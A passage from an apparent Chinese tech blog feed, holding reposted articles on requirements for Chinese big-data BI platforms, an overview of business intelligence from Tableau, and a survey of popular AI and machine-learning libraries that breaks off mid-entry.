提升自助分析的可操作性和功能丰富度</h1><p>为满足业务人员可通过BI工具进行自助数据分析的需求，中国大数据BI产品需要改善自助分析的功能和可操作性，包括图表的丰富性。</p><p>前端布局自定义搭配，让业务人员随心所欲布置。比如仪表板自由布局，可快速拖拽生成所需要分析的页面；在全面支持常见的柱状图、条形图等图形基础上，增加支持中国（世界）地图、GIS地图、桑基图等大数据图表；</p><p>为了适应更加多样的用户，大数据BI平台需要支持强大的OLAP多维分析功能，包括分析视角的上卷、下钻，维度的旋转切换，指标的切换，分析数据的切片过滤，组件之间的联动过滤、页面超级链接跳转等。业务人员在OLAP多维分析的基础上，能够在数据分析查看时，再次对所有维度进行二次的维度指标加工，并无限层次多维透视分析统计，全面开放业务人员对数据的处理和分析操作，以满足当前中国用户多个视角、多个层级的分析需求，把传统业务分析的智慧充分沉淀到数据分析系统中来。</p><p>为了给不同用户提供个性化的视觉体验，大数据BI平台支持表格动态数值预警功能和图形设置动态警戒线，支持图表样式风格自由拖拽调整。同时，也需要大数据BI平台智能自动设置预警值和样式风格等。</p><h1 id="二-提升平台的数据挖掘能力"><a href="#二-提升平台的数据挖掘能力" class="headerlink" title="(二) 提升平台的数据挖掘能力"></a>(二) 提升平台的数据挖掘能力</h1><p>为满足企业业务人员自助数据分析和自动挖掘的需求，中国大数据BI产品需要在已有的数据可视化和数据分析的功能基础上，增强数据自动挖掘能力，使业务人员在能够掌握挖掘基本概念的基础上，深入挖掘分析业务数据，为业务运营提供数据结论支持。</p><p>大数据BI平台需要支持嵌入式高级分析功能，用户能够轻松使用平台内置的高级分析功能，也可以通过导入和集成外部开发的高级分析模型。比如平台内含数据挖掘常见算法（如线性预测、时序预测、聚类、分类等），或者提供外接其他数据挖掘平台和工具的可视化接口（如R语言或者Python语言），甚至内含适合特定业务场景的挖掘模型 。</p><h1 id="三-提升平台大数据处理能力"><a href="#三-提升平台大数据处理能力" class="headerlink" title="(三) 提升平台大数据处理能力"></a>(三) 提升平台大数据处理能力</h1><p>为满足企业对大数据BI平台实时响应的需求，中国大数据BI产品需要将当前大数据处理能力提升一个量级，达到10亿数据量秒级响应水平，同时支持丰富多样的数据源。</p><p>大数据BI平台需要支持丰富的数据源，如企业主流的关系型数据库、大数据平台、NOSQL数据库以及多维数据库，需要支持实时对接数据平台和分布式引擎拓展，同时支持跨数据源关联，同时支持对较大级别数据量进行数据抽取和索引建模，提高数据分析效率。</p><h1 id="四-提升平台的数据管理能力"><a href="#四-提升平台的数据管理能力" class="headerlink" title="(四) 提升平台的数据管理能力"></a>(四) 提升平台的数据管理能力</h1><p>为了满足中国企业业务人员用户对数据处理的需求，中国大数据BI平台需要提升自身的元数据管理能力、数据的ETL处理能力、数据存储能力。</p><p>提高元数据管理能力，使得用户能够集中管理元数据，包括对元数据进行检索、提取、处理、存储、分享复用和对外发布。中国企业的业务人员将需要在数据分析的过程中，直接操作经过IT人员标准化处理的元数据。</p><p>近几年来，中国数据分析人才迅速增加，企业中也成长出一批有一定数据分析能力的业务人才，这些中国企业业务人才更多的是需要对数据进行ETL处理和存储，这就需要平台功支持用于查询、提取、转换和加载的功能，具有索引、管理、调度数据的能力。</p><h1 id="五-提升平台分析的共享能力"><a href="#五-提升平台分析的共享能力" class="headerlink" title="(五) 提升平台分析的共享能力"></a>(五) 提升平台分析的共享能力</h1><p>随着ERP、OA、MES、HIS等常见业务系统的完善，企业少则数十套IT系统，多则上千套系统。新型自助BI需要能够与多个系统同时融合，全面分析企业的业务数据。这就需要中国大数据BI产品需要加强产品与不同软件系统的集成融合能力，这是中国企业面临的共同难题。大数据BI平台需要支持嵌入式部署，如主流的应用服务器，支持跨平台的权限集成和页面集成。</p><p>大数据BI平台不同用户创建的分析页面，可以方便地分享给其他成员。同时，在企业的分析用户设计仪表板时，可以复用仪表板中的图表、维度、指标等，支持用户分享指定页面进行给其他部门成员，便于互动沟通交流。</p><p>为满足企业人员实时办公、互通信息的需要。大数据BI平台还需要支持移动端上共享和查看分析结果，支持在移动端对分析结果进行数据层级钻取穿透、联动等。</p><h1 id="六-提升平台的安全性"><a href="#六-提升平台的安全性" class="headerlink" title="(六) 提升平台的安全性"></a>(六) 提升平台的安全性</h1><p>为了满足企业多级部门同时使用、不同权限的功能，中国大数据BI产品除了要提供灵活丰富的用户管理功能、权限控制功能，还需要内置强大的用户行为监控与分析功能，确保企业的数据安全和信息保密。</p><p>大数据BI平台将支持持批量导入用户，支持同步企业统一权限管理数据库中的用户，以企业IT系统统一的用户管理方式进行用户管理。支持用户以企业IT系统统一的用户权限认证方式进行权限管理。同时，需要支持短信平台功能，并可用于用户账号身份验证等，多种用户和权限管理方式，来满足广大中国企业的不同的安全级别要求和安全管理策略。</p><p>随着大数据BI在中国的发展，中国企业自身的大数据BI平台已有众多员工账号。这就对大数据BI平台提出新的挑战，除了要拦截非法用户，还要对大数据BI平台有效用户进行有效监控。2018年，大数据BI平台需要支持监控用户的操作行为，支持监控页面被访问的频次、访问来源，甚至是支持监控访问到的数据范围。</p><p>为了保证大数据 BI平台系统持续支持企业经营管理，需要大数据BI平台支持系统数据迁移到企业数据库，支持对系统进行备份与还原，备份可以手动或设置周期定时备份。同时，支持云端服务器部署和本地服务器部署，支持多机热备，达到企业的灾备要求。此外，为了有效避免BI平台出现严重异常，还需要支持监控自身的运行性能，遇到系统性能风险，提前给出系统预警信号。</p><p>本文来源「帆软数据应用研究院」</p><p>声明：本文来自数据观，版权归作者所有。文章内容仅代表作者独立观点，不代表安全内参立场，转载目的在于传递更多信息。如有侵权，请联系 <a href="mailto:&#97;&#x6e;&#x71;&#x75;&#97;&#110;&#x6e;&#101;&#x69;&#99;&#97;&#x6e;&#x40;&#49;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;">&#97;&#x6e;&#x71;&#x75;&#97;&#110;&#x6e;&#101;&#x69;&#99;&#97;&#x6e;&#x40;&#49;&#x36;&#x33;&#x2e;&#99;&#x6f;&#109;</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>商务智能概览</title>
      <link href="/2023/04/07/%E5%95%86%E5%8A%A1%E6%99%BA%E8%83%BD%E6%A6%82%E8%A7%88/"/>
      <url>/2023/04/07/%E5%95%86%E5%8A%A1%E6%99%BA%E8%83%BD%E6%A6%82%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.tableau.com/learn/articles/business-intelligence">Business intelligence: A complete overview</a><br>对于企业来说，清楚地了解所有数据以保持竞争力变得越来越重要，而这正是商业智能 (BI) 工具的用武之地。毕竟，近 50% 的企业已经在使用 BI 工具，而且预测显示在持续增长 未来几年。</p><p>但对于那些尚未采用某种工具或只是想了解更多信息的人来说，可能很难准确理解什么是 BI。 我们创建了这个完整的指南来教育人们了解 BI 是什么、它是如何工作的等等。</p><p>在本文中，我们涵盖：</p><ol><li>什么是商业智能？</li><li>BI 是如何工作的？</li><li>商业智能的好处</li><li>BI的例子</li><li>如何创建 BI 策略</li><li>BI分析的分类</li><li>BI的优缺点</li><li>BI 平台</li><li>BI和大数据</li><li>BI 的未来角色</li><li>自助式BI</li><li>进一步学习</li></ol><h1 id="1-什么是商业智能？"><a href="#1-什么是商业智能？" class="headerlink" title="1. 什么是商业智能？"></a>1. 什么是商业智能？</h1><p>商业智能结合了业务分析、数据挖掘、数据可视化、数据工具和基础设施以及最佳实践，以帮助组织做出更多数据驱动的决策。在实践中，当您全面了解组织的数据并使用该数据推动变革、消除低效率并快速适应市场或供应变化时，您就知道自己拥有现代商业智能。现代 BI 解决方案优先考虑灵活的自助服务分析、受信任平台上的受控数据、授权业务用户以及快速获得洞察力。</p><p>重要的是要注意，这是对 BI 的一个非常现代的定义，而 BI 作为一个流行词有着被扼杀的历史。传统的商业智能，大写字母等等，最初出现于 1960 年代，作为跨组织共享信息的系统。商业智能一词与用于决策的计算机模型一起于 1989 年被创造出来。这些程序进一步发展，将数据转化为洞察力，然后成为具有依赖 IT 的服务解决方案的 BI 团队的特定产品。本文将作为BI的介绍，是冰山一角。</p><h1 id="2-商业智能如何运作"><a href="#2-商业智能如何运作" class="headerlink" title="2. 商业智能如何运作"></a>2. 商业智能如何运作</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-e2538062d7048afa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>企业和组织有问题和目标。 为了回答这些问题并跟踪这些目标的绩效，他们收集必要的数据，对其进行分析，并确定要采取哪些行动来实现他们的目标。</p><p>在技术方面，原始数据是从业务系统收集的。 数据经过处理，然后存储在数据仓库、云、应用程序和文件中。 存储后，用户可以访问数据，开始分析过程以回答业务问题。</p><p>BI 平台还提供数据可视化工具，可将数据转换为图表或图形，并呈现给任何关键利益相关者或决策者。</p><h1 id="3-BI方法"><a href="#3-BI方法" class="headerlink" title="3. BI方法"></a>3. BI方法</h1><p>商业智能不仅仅是一个特定的“事物”，它还是一个总称，涵盖了从业务运营或活动中收集、存储和分析数据以优化绩效的过程和方法。所有这些都汇集在一起，形成了一个全面的业务视图，帮助人们做出更好的、可操作的决策。在过去几年中，商业智能已经发展到包括更多流程和活动以帮助提高绩效。这些过程包括：</p><ul><li>数据挖掘：使用数据库、统计数据和机器学习 (ML) 来揭示大型数据集中的趋势</li><li>报告：与利益相关者共享数据分析，以便他们得出结论并做出决策</li><li>性能指标和基准测试：将当前性能数据与历史数据进行比较，以根据目标跟踪性能，通常使用自定义仪表板</li><li>描述性分析：使用初步数据分析找出发生了什么</li><li>查询：询问特定于数据的问题，BI 从数据集中提取答案</li><li>统计分析：从描述性分析中获取结果，并使用统计数据进一步探索数据，例如这种趋势是如何发生的以及为什么发生</li><li>数据可视化：将数据分析转化为图表、图形和直方图等可视化表示，以更轻松地使用数据</li><li>视觉分析：通过视觉叙事探索数据，即时交流见解并保持分析流程</li><li>数据准备：汇集多个数据源，确定维度和度量，为数据分析做准备</li></ul><h1 id="4-BI、数据分析和业务分析如何协同工作"><a href="#4-BI、数据分析和业务分析如何协同工作" class="headerlink" title="4. BI、数据分析和业务分析如何协同工作"></a>4. BI、数据分析和业务分析如何协同工作</h1><p>商业智能包括数据分析和业务分析，但仅将它们用作整个过程的一部分。 BI帮助用户从数据分析中得出结论。数据科学家深入研究数据的细节，使用高级统计和预测分析来发现模式和预测未来模式。</p><p>数据分析会问：“为什么会发生这种情况，接下来会发生什么？”商业智能采用这些模型和算<br>法并将结果分解为可操作的语言。根据 Gartner 的 IT 词汇表，“业务分析包括数据挖掘、预测分析、应用分析和统计。”简而言之，组织将业务分析作为其更大的商业智能战略的一部分。</p><p>BI 旨在回答特定查询并为决策或计划提供一目了然的分析。但是，公司可以使用分析过程来不断改进后续问题和迭代。业务分析不应该是一个线性过程，因为回答一个问题可能会导致后续问题和迭代。相反，将该过程视为数据访问、发现、探索和信息共享的循环。这称为分析周期，这是一个现代术语，解释了企业如何使用分析来应对不断变化的问题和期望。</p><h1 id="5-传统BI与现代BI的区别"><a href="#5-传统BI与现代BI的区别" class="headerlink" title="5. 传统BI与现代BI的区别"></a>5. 传统BI与现代BI的区别</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-85a1f28b66ffdbff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>现代 BI 优先考虑自助服务分析和洞察速度。</p><p>从历史上看，商业智能工具基于传统的商业智能模型。这是一种自上而下的方法，其中商业智能由 IT 组织驱动，并且大多数（如果不是全部）分析问题通过静态报告得到回答。这意味着如果有人对他们收到的报告有后续问题，他们的请求将进入报告队列的底部，他们将不得不重新开始该过程。这导致报告周期缓慢、令人沮丧，而且人们无法利用当前数据做出决策。</p><p>传统的商业智能仍然是定期报告和回答静态查询的常用方法。然而，现代商业智能是交互式的、易于理解的。虽然 IT 部门仍然是管理数据访问的重要部分，但多个级别的用户可以自定义仪表板并在很少通知的情况下创建报告。使用合适的软件，用户可以可视化数据并回答他们自己的问题。</p><h1 id="6-商业智能的好处"><a href="#6-商业智能的好处" class="headerlink" title="6. 商业智能的好处"></a>6. 商业智能的好处</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-21a34513ca7e5970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>Great BI 帮助企业和组织提出和回答有关其数据的问题。</p><p>现在您知道什么是 BI 及其工作原理了。 但是 BI 如何真正帮助企业？</p><p>BI 不仅仅是软件——它是一种保持所有相关业务数据的整体和实时视图的方法。 实施 BI 提供了无数好处，从更好的分析到增加竞争优势。 一些主要的商业智能优势包括：</p><ul><li>数据清晰度</li><li>提高效率</li><li>更好的客户体验</li><li>提高员工满意度</li></ul><h1 id="7-BI的例子"><a href="#7-BI的例子" class="headerlink" title="7. BI的例子"></a>7. BI的例子</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-6f6bbf08cb0e6128.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>Tableau 的“解释数据”功能有助于快速识别异常值和数据趋势的可能解释。</p><p>许多不同的行业都率先采用了企业 BI，包括医疗保健、信息技术和教育。所有组织都可以使用数据来转变运营。鉴于本文中和在线提供的信息如此之多，可能很难理解 BI 的确切功能。现实世界的例子可以提供帮助，这就是为什么我们根据客户的成功故事构建案例研究。</p><p>例如，金融服务公司 Charles Schwab 使用商业智能来全面了解其在美国的所有分支机构，以了解绩效指标并确定机会领域。通过访问中央商业智能平台，Schwab 可以将其分支机构数据整合到一个视图中。现在，分行经理可以识别出投资需求可能发生变化的客户。领导层可以跟踪某个地区的绩效是高于还是低于平均水平，然后点击查看推动该地区绩效的分支机构。这会带来更多的优化机会以及为客户提供更好的客户服务。</p><p>另一个例子是餐包服务 HelloFresh，它自动化了报告流程，因为它的数字营销团队每个月在这上面花费了太多时间。在 Tableau 的帮助下，HelloFresh 每天为团队节省了 10 到 20 个工作小时，并使他们能够创建更加细分和有针对性的营销活动。</p><h1 id="8-如何制定商业智能战略"><a href="#8-如何制定商业智能战略" class="headerlink" title="8. 如何制定商业智能战略"></a>8. 如何制定商业智能战略</h1><p>BI 策略是您成功的蓝图。 您需要决定如何使用数据、收集关键角色并在初始阶段定义职责。 从高层次上讲，这听起来很简单； 但是，从业务目标开始是您成功的关键。</p><p>以下是如何从头开始创建 BI 策略：</p><ul><li>了解您的业务战略和目标。</li><li>确定关键利益相关者。</li><li>从您的主要利益相关者中选择赞助商。</li><li>选择您的 BI 平台和工具。</li><li>创建一个 BI 团队。</li><li>定义你的范围。</li><li>准备您的数据基础架构。</li><li>定义您的目标和路线图。</li></ul><h1 id="9-BI分析的分类"><a href="#9-BI分析的分类" class="headerlink" title="9. BI分析的分类"></a>9. BI分析的分类</h1><p>BI 分析分为三种主要类型，涵盖许多不同的需求和用途。 这些是预测分析、描述分析和规范分析。</p><p>预测分析采用历史和实时数据并对未来结果进行建模以用于规划目的。 描述性分析是使用历史和当前数据识别数据趋势和关系的过程。 规范分析利用所有相关数据来回答“我的企业应该做什么？”这个问题。</p><h1 id="10-BI的优缺点"><a href="#10-BI的优缺点" class="headerlink" title="10. BI的优缺点"></a>10. BI的优缺点</h1><p>我们已经介绍了 BI 的许多优点。 但与任何重大业务决策一样，实施 BI 会遇到一些困难和缺点，尤其是在实施阶段。</p><p>BI 的一些优点包括：</p><ul><li>数据可见性</li><li>准确的报告</li><li>简化流程</li></ul><p>BI 的缺点包括：</p><ul><li>初始投资成本</li><li>用户抵制</li><li>数据技能差距</li></ul><h1 id="11-商业智能平台"><a href="#11-商业智能平台" class="headerlink" title="11. 商业智能平台"></a>11. 商业智能平台</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-75b6ebde766d74b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可视化分析让您处于数据分析流程中。</p><p>许多自助式商业智能工具和平台简化了分析过程。 这使人们更容易查看和理解他们的数据，而无需自己挖掘数据的技术知识。 有许多 BI 平台可用于临时报告、数据可视化以及为多个级别的用户创建自定义仪表板。 我们概述了评估现代 BI 平台的建议，以便您可以为您的组织选择合适的平台。 呈现商业智能的一种更常见的方式是通过数据可视化。</p><h1 id="12-如何选择BI平台"><a href="#12-如何选择BI平台" class="headerlink" title="12. 如何选择BI平台"></a>12. 如何选择BI平台</h1><p>成功实施 BI 的关键是为工作选择合适的平台。 在选择工具时，最好记住哪些关键功能对您的业务最有帮助。 BI 工具的一些主要功能包括：</p><ul><li>使用直观</li><li>各种仪表板和可视化选项</li><li>聪明的见解</li><li>好指标和坏指标的警报</li><li>内置人工智能 (AI)</li><li>部署灵活性</li><li>与其他平台和应用程序集成</li><li>数据连接</li><li>嵌入业务应用程序</li></ul><h1 id="13-BI-仪表板"><a href="#13-BI-仪表板" class="headerlink" title="13. BI 仪表板"></a>13. BI 仪表板</h1><p>可以说，BI 中最有用的工具之一是仪表板，它允许在一个地方聚合和查看复杂的数据。 这些仪表板可以有不同的目的，例如用于复杂的分析或利益相关者的支持。 挑战在于构建满足您需求的最佳仪表板。</p><p>BI 仪表板的主要功能是：</p><ul><li>互动性</li><li>实时数据</li><li>可定制的界面</li><li>标准模板</li><li>分享能力</li></ul><h1 id="14-BI和大数据"><a href="#14-BI和大数据" class="headerlink" title="14. BI和大数据"></a>14. BI和大数据</h1><p>随着数据环境的发展以及数据的收集、存储和分析变得更加复杂，考虑 BI 与大数据之间的关系变得很重要。 大数据最近在业界有点流行，那么大数据到底是什么呢？ 好吧，数据专家通过“四个 V”来定义它：数量、速度、价值和多样性。 这四个定义了大数据并将其区分开来。 特别是，容量是人们通常指出的主要决定因素，因为数据量不断增加并且相对容易长期存储。</p><p>可以想象，这对于 BI 很重要，因为企业每年都会创建越来越多的数据，而 BI 平台必须跟上对它们不断增长的需求。 一个好的平台会随着需求的增加而增长。 但如果不加以维护，仪表板和数据源可能会随着大数据的发展而落后。</p><h1 id="15-商业智能的未来作用"><a href="#15-商业智能的未来作用" class="headerlink" title="15. 商业智能的未来作用"></a>15. 商业智能的未来作用</h1><p>商业智能不断发展以跟上业务需求和技术的步伐，因此每年我们都会确定当前趋势，让用户了解最新的创新。 意识到人工智能和机器学习将继续发展，企业可以将 AI 的洞察力整合到更广泛的 BI 战略中。 随着公司努力变得更加数据驱动，共享数据和协作的努力将会增加。 数据可视化对于跨团队和部门的合作将更加重要。 本文只是对商业智能世界的介绍。 BI 提供近乎实时的销售跟踪功能，使用户能够深入了解客户行为、预测利润等。 零售、保险和石油等不同行业都采用了 BI，并且每年都有更多行业加入。 BI 平台适应新技术及其用户的创新。</p><h1 id="16-为您的公司使用自助式商业智能-SSBI"><a href="#16-为您的公司使用自助式商业智能-SSBI" class="headerlink" title="16. 为您的公司使用自助式商业智能 (SSBI)"></a>16. 为您的公司使用自助式商业智能 (SSBI)</h1><p>如今，越来越多的组织正在转向现代商业智能模型，其特点是对数据的自助服务方法。 自助式商业智能 (SSBI) 的特点是 IT 管理数据（安全性、准确性和访问），允许用户直接与其数据交互。 Tableau 等现代分析平台可帮助组织处理分析周期中的每一步——Tableau Prep 中的数据准备、Tableau Desktop 中的分析和发现，以及 Tableau Server 或 Tableau Cloud 中的共享和治理。 这意味着 IT 可以管理数据访问，同时让更多人能够直观地探索他们的数据并分享他们的见解。</p><h1 id="17-了解有关商务智能的更多信息"><a href="#17-了解有关商务智能的更多信息" class="headerlink" title="17. 了解有关商务智能的更多信息"></a>17. 了解有关商务智能的更多信息</h1><p>尽管本文涵盖了很多关于商业智能及其各种应用程序的基础知识，但还有很多东西需要学习。 我们的专家总是在扩展他们的知识并紧跟当前趋势。</p><p>为了鼓励数据学习，我们编制了进一步学习资源列表。 如果您想更深入地了解 BI 的理论和历史，请查看我们的最佳 BI 书籍列表。 要跟上最新的新闻和见解，请查看我们要关注的最佳 BI 博客列表。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盘点程序员必须了解的十大最佳AI库及框架</title>
      <link href="/2022/11/21/%E7%9B%98%E7%82%B9%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E9%A1%BB%E4%BA%86%E8%A7%A3%E7%9A%84%E5%8D%81%E5%A4%A7%E6%9C%80%E4%BD%B3AI%E5%BA%93%E5%8F%8A%E6%A1%86%E6%9E%B6/"/>
      <url>/2022/11/21/%E7%9B%98%E7%82%B9%E7%A8%8B%E5%BA%8F%E5%91%98%E5%BF%85%E9%A1%BB%E4%BA%86%E8%A7%A3%E7%9A%84%E5%8D%81%E5%A4%A7%E6%9C%80%E4%BD%B3AI%E5%BA%93%E5%8F%8A%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.huoban.com/news/post/1393.html">盘点程序员必须了解的十大最佳AI库及框架</a></p><p>眼下，AI 已经成为越来越火的一个方向，程序员对于新技术是最敏感的一个人群，作为一名程序员如何转向人工智能方向?</p><p>本文将向您介绍一些在人工智能(AI)领域常被使用的优质软件库，并且分析它们的优/劣势和自身特点。</p><p>虽然 AI 曾经被称为只有书呆子和天才才去触碰的专业领域，但是现如今由于各种软件库和框架的发展，它已成为一个更加开放的 IT 领域，很多人都已投身于其中。</p><p>现在就让我们来深入了解和探索这个纷繁的 AI 库的世界吧!</p><h3 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h3><p>“通过使用数据流图的计算，来实现可扩展的<a href="https://www.huoban.com/news/tags-258.html">机器学习</a>”，语言：C++ 或 Python。<br>当提到 AI 的时候，您首先听到的框架应该就是谷歌的 TensorFlow。</p><p>TensorFlow 是使用数据流图来执行数值计算的开源库。该框架的特点是它可以利用任何 CPU 或 GPU 进行计算，无论是<a href="https://www.huoban.com/news/tags-780.html">台式机</a>、<a href="https://www.huoban.com/news/tags-16.html">服务器</a>、甚至是移动设备的架构都可以实现。这个框架中提供了 Python 语言的编程环境。</p><p>TensorFlow 通过所谓的各种节点来分类数据层，并对它所获得的任何信息做出判定。<br>想了解更多相关信息，可以参看：<a href="https://www.tensorflow.org/">https://www.tensorflow.org/</a></p><p><strong>优势：</strong></p><ul><li>使用一种简单易学的语言–Python。</li><li>采用计算图形的抽象。</li><li>由 TensorBoard 提供可视化。</li></ul><p><strong>劣势：</strong></p><ul><li>由于 Python 并非是最快的语言，因此该软件库运行起来并不快。</li><li>缺乏各种预先训练好(pre-trained)的模型。</li><li>并非完全开源。</li></ul><h3 id="微软-CNTK"><a href="#微软-CNTK" class="headerlink" title="微软 CNTK"></a>微软 CNTK</h3><p>“一个开源的深度学习工具包”，语言：C++。<br>我们可以称之为微软对于谷歌 TensorFlow 的“回应”。</p><p>微软的计算网络工具包(Microsoft’s Computational Network ToolKit，CNTK)是一种能够提高模块化和分离式计算网络的软件库，它还提供了各种学习算法和模型的描述。<br>在需要有大量服务器参与运行的时候，CNTK 可以利用多台服务器来同步实现。虽然据说它在功能上将会对谷歌 TensorFlow 有所屏蔽，但现在看来还为时过早。</p><p>想了解更多相关信息，可以参看：<a href="https://github.com/Microsoft/CNTK">https://github.com/Microsoft/CNTK</a></p><p><strong>优势：</strong></p><ul><li>非常灵活。</li><li>可实现分布式的训练。</li><li>支持 C++，C#，Java 和 Python。</li></ul><p><strong>劣势：</strong></p><ul><li><p>它是由一种新的语言–网络描述语言(NetworkDescription Language，NDL)来实现。</p></li><li><p>可视化不足。</p></li></ul><h3 id="Theano"><a href="#Theano" class="headerlink" title="Theano"></a>Theano</h3><p>“一种数值计算的软件库”，语言：Python。<br>Theano 是 TensorFlow 的强有力竞争者。它是一个功能强大的 Python 库，能够高效地实现与各种多维数组有关的数值运算。<br>该软件库能够准确地使用 GPU 来执行各种数据密集型的计算，而不会在运行中给 CPU 增加负担。<br>出于这个原因，在近十年来，Theano 一直被运用于供电系统内部各种大规模的计算密集型操作。<br>不过在 2017 年 9 月，Theano 宣布将在 2017 年 11 月的最后一次重要发布之后，对其 1.0 版本停止更新。</p><p>当然，这并不意味着它在功能上会有所逊色，只要您愿意，对它随时展开研究都是值得的。<br>想了解更多相关信息，可以参看：<a href="https://github.com/Theano/Theano">https://github.com/Theano/Theano</a></p><p><strong>优势：</strong></p><ul><li>对 CPU 和 GPU 的使用进行了适当的优化。</li><li>高效的数字任务处理能力。</li></ul><p><strong>劣势：</strong></p><ul><li>原生的 Theano 相对于其他软件库的水平较低，需要与其他软件库一起使用，以获得较高的抽象水平。</li><li>在 AWS 上运行时会有一些 Bug。</li></ul><h3 id="Caffe"><a href="#Caffe" class="headerlink" title="Caffe"></a>Caffe</h3><p>“深度学习的开放式框架，且速度快”，语言：C++。<br>Caffe 是一个功能强大的深度学习框架。和上述列表中的其他框架相比，它能够实现快速和有效的深度学习式研究。</p><p>通过Caffe，您可以非常容易地为图像分类，建立卷积神经网络(convolutional neural network，CNN)。Caffe 能够有效地工作在 GPU 上，并且在运行过程中能够发挥极快的速度。<br>想了解更多相关信息，可以参看：<a href="http://caffe.berkeleyvision.org/">http://caffe.berkeleyvision.org/</a></p><p>Caffe 的主要类包括：</p><p><strong>优势：</strong></p><ul><li>可与 Python 和 MATLAB 绑定。</li><li>运行性能极佳。</li><li>无需编写代码，便可实现对各个模型的训练。</li></ul><p><strong>劣势：</strong></p><ul><li>对复发性的网络(recurrent networks)支持不佳。</li><li>与新架构的协同性不好。</li></ul><h3 id="Keras"><a href="#Keras" class="headerlink" title="Keras"></a>Keras</h3><p>“为人类的深度学习而打造”，语言：Python。<br>Keras 是一个用 Python 编写的开源神经网络库。不像 TensorFlow、CNTK 和 Theano，Keras 并不服务于端到端的机器学习框架。<br>相反地，作为一个接口，它提供了一个高层次的抽象，这使得无论是在什么样的框架下，神经网络都能够方便地进行配置。<br>目前谷歌 TensorFlow 能够将 Keras 作为后端予以支持，而微软的 CNTK 是否会在将来支持 Keras，则暂无时间表。<br>想了解更多相关信息，可以参看：<a href="https://keras.io/">https://keras.io/</a></p><p><strong>优势：</strong></p><ul><li>用户友好且容易上手。</li><li>容易扩展。</li><li>无缝运行在 CPU 和 GPU 上。</li><li>能与 Theano 和 TensorFlow 无缝协作。</li></ul><p><strong>劣势：</strong></p><ul><li>无法作为一个独立的框架被使用。</li></ul><h3 id="Torch-火炬"><a href="#Torch-火炬" class="headerlink" title="Torch(火炬)"></a>Torch(火炬)</h3><p>“一个开源的机器学习库”，语言：C。<br>Torch 是一个为科研和数值运算打造的、开源的机器学习库。它基于的是 Lua 编程语言，而非 Python 库。通过提供大量的算法，它不但使得深度学习研究更为容易，而且能提高效率和速度。<br>Torch 具有强大的 N 维阵列，这对于诸如切片和索引等操作是非常有用的。它还提供了线性代数的程序和神经网络的模型。</p><p>想了解更多相关信息，可以参看：<br><a href="http://torch.ch/">http://torch.ch/</a></p><p><strong>优势：</strong></p><ul><li>非常灵活。</li><li>有极高的速度和效率。</li><li>具有大量的预先训练好的模型。</li></ul><p><strong>劣势：</strong></p><ul><li>文档不清。</li><li>缺少即插即用的代码。</li><li>基于的是一种不那么流行的语言–Lua。</li></ul><h3 id="Accord-NET"><a href="#Accord-NET" class="headerlink" title="Accord.NET"></a>Accord.NET</h3><p>“支持机器学习、计算机视觉、统计、以及使用.NET的科学计算”，语言：C#。<br>这是为C#程序员准备的软件库，Accord.NET 是一种 .NET 的机器学习框架，它方便了音频和图像的各种处理。<br>该框架可以有效地处理数值优化、人工神经网络、甚至可视化等方面。除此之外，Accord.NET 在计算机视觉和信号处理上也具有强大的功能，而且通过一些简单的算法就能实现。<br>想了解更多相关信息，可以参看：<a href="http://accord-framework.net/">http://accord-framework.net/</a></p><p><strong>优势：</strong></p><ul><li>它拥有一个庞大且活跃的开发团队。</li><li>具有非常好的文档框架。</li><li>可实现质量可视化。</li></ul><p><strong>劣势：</strong></p><ul><li>该框架并不是非常流行。</li><li>比 TensorFlow 要运行得缓慢一些。</li></ul><h3 id="Spark-MLlib"><a href="#Spark-MLlib" class="headerlink" title="Spark MLlib"></a>Spark MLlib</h3><p>“一个可扩展的机器学习库”，语言：Scala。<br>Apache 的 Spark MLlib 是一个极具扩展性的机器学习库。它支持的编程语言有 Java、Scala、Python、甚至是 R 语言。<br>它能够非常有效地通过 Python 和 R 语言的 Numpy 库(译者注：NumPy 系统是 Python 的一种开源的数值计算扩展)进行交互操作。<br>MLlib 能够很容易地被植入到 Hadoop 的工作流中。它还能提供诸如分类、回归、归并等机器学习的算法。在涉及到大规模数据处理时，这款功能强大的软件库运行起来非常快。</p><p>想了解更多相关信息，可以参看：<a href="https://spark.apache.org/mllib/">https://spark.apache.org/mllib/</a></p><p><strong>优势：</strong></p><ul><li>能极快速地处理大规模的数据。</li><li>支持多种语言。</li></ul><p><strong>劣势：</strong></p><ul><li>学习曲线“陡峭”(即不易学习)。</li><li>只能对 Hadoop 实现即插即用。</li></ul><h3 id="Sci-kitLearn"><a href="#Sci-kitLearn" class="headerlink" title="Sci-kitLearn"></a>Sci-kitLearn</h3><p>“使用 Python 进行机器学习”，语言：Python。<br>SCI-Kit 是一款主要用于在机器学习中构建各类模型的、非常强大的 Python 库。<br>通过使用诸如 Numpy、SciPy 和 Matplotlib 之类的库，它对于诸如分类、回归、归并等统计模型非常有效。SCI-Kit 还能为您带来监管式与无监管式的学习算法、以及交叉验证等功能。</p><p>想了解更多相关信息，可以参看：<a href="http://scikit-learn.org/">http://scikit-learn.org/</a></p><p><strong>优势：</strong></p><ul><li>能支持许多主流的算法。</li><li>提供有效的数据挖掘。</li></ul><p><strong>劣势：</strong></p><ul><li>对于构建模型来说并非是最好的。</li><li>使用 GPU 时，效果并非最佳。</li></ul><h3 id="MLPack"><a href="#MLPack" class="headerlink" 